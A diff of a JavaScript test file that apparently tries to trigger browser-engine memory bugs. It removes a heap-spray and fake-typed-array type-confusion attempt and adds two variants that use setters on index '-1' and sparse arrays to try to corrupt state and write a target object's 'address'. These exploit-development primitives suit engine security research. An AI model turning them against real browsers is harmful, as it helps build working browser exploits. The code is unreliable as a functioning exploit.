@@ -1,43 +1,110 @@
+/*
 const NUM_ITERATIONS = 10;
-const SPRAY_SIZE = 100000;
-const v4 = [{a: 0}, {a: 1}, {a: 2}, {a: 3}, {a: 4}];
-let ab = new ArrayBuffer(0x1000);
-let x = {buffer: ab, length: 13.39, byteOffset: 13.40, data: 3.54484805889626e-310};
-let y = new Uint32Array(ab);
+const ARRAY_LENGTH = 10000; 
+
+
+let arr1 = [];
+let arr2 = [1.1, 2.2, , 4.4];
 let TARGET = { secret: 0x12345678 };
+let BUFFER = new Array(10000);
 
-// Heap Spray
-let spray = new Array(SPRAY_SIZE).fill({ data: y });
 
-function v7(v8, v9) {
-    if (v4.length == 0) {
-        v4[3] = y;
-        alert('v4[3] set to y');
-    }
-    const v11 = v4.pop();
+arr2.__defineSetter__("-1", function(x) {
+    alert('Setter called on -1, deleting arr1.x');
+    delete arr1.x;
+});
+
+function f(b, index, target) {
+    let ai = { x4: 42 };
+    let aT = { x4: 1337 };
+    arr1.x = ai;
+    if (b) arr1.x = aT;
+    arr2[index] = 1.1;
     try {
-        v11[0] = 0xdeadbeef; 
-        alert('Write to v11[0] succeeded with value: ' + v11[0].toString(16));
-        v11[1] = TARGET; 
-        let readValue = v11[0]; 
-        alert('Read from v11[0] = ' + readValue.toString(16));
+        let result = arr1.x.x4;
+        alert('Result of arr1.x.x4 = ' + result);
     } catch (e) {
         alert('Crash or Type Confusion: ' + e);
     }
-    for (let v15 = 0; v15 < 100; v15++) {}
+    if (index === -1 && target) {
+        arr1.x = target;
+    }
+    return arr1.x ? arr1.x.x4 : null;
 }
 
-var p = {};
-p.__proto__ = [y, y, y];
-p[0] = x;
-v4.__proto__ = p;
+function main() {
+    for (let i = 0; i < NUM_ITERATIONS; i++) {
+        arr2.length = 4;
+        f((i & 1) === 1, 5, null);
+    }
+    f(true, -1, TARGET); // Trigger with TARGET
+    alert('Final arr1.x.x4 = ' + (arr1.x ? arr1.x.x4 : 'undefined'));
+    alert('TARGET.secret = ' + TARGET.secret);
+}
+
+main();
+*/
+
+
+
+
+
+
+
+
+
+
+
+const NUM_ITERATIONS = 10;
+const ARRAY_LENGTH = 1000; 
+
+let OBJ = { a: 41 };
+OBJ.a = 42;
+let TARGET = { secret: 0x12345678, extra: 0x87654321 };
+let OTHER = { value: 0xdeadbeef };
+let BUFFER = new Array(10000); // 
+
+function f(obj, idx, targetAddr) {
+    let v = OBJ.a;
+    alert('Before write, OBJ.a = ' + OBJ.a);
+    obj[idx] = v;
+    if (targetAddr && idx === -1) {
+        try {
+            obj[-1] = targetAddr;
+            alert('Attempted to write TARGET address to obj[-1]: ' + targetAddr);
+        } catch (e) {
+            alert('Error writing to obj[-1]: ' + e);
+        }
+    }
+    alert('After write, OBJ.a = ' + OBJ.a);
+    return OBJ.a;
+}
 
 function main() {
-    for (let v31 = 0; v31 < NUM_ITERATIONS; v31++) {
-        v7();
+    for (let i = 0; i < NUM_ITERATIONS; i++) {
+        let isLastIteration = i === NUM_ITERATIONS - 1;
+        let idx = isLastIteration ? -1 : ARRAY_LENGTH;
+
+        let obj = new Array(ARRAY_LENGTH);
+        Object.defineProperty(obj, '-1', {
+            set(value) {
+                alert('Setter triggered for value ' + value + ', changing OBJ.a to 1337');
+                OBJ.a = 1337;
+            }
+        });
+
+        for (let j = 0; j < ARRAY_LENGTH; j++) {
+            if (j === ARRAY_LENGTH / 2) continue;
+            obj[j] = j;
+        }
+
+        let r = f(obj, idx, isLastIteration ? TARGET : null);
+        alert('Iteration ' + i + ': Result = ' + r);
     }
+    alert('Final OBJ.a = ' + OBJ.a);
     alert('TARGET.secret = ' + TARGET.secret);
-    alert('y[0] = ' + y[0].toString(16));
+    alert('TARGET.extra = ' + TARGET.extra);
+    alert('OTHER.value = ' + OTHER.value);
 }
 
 main();
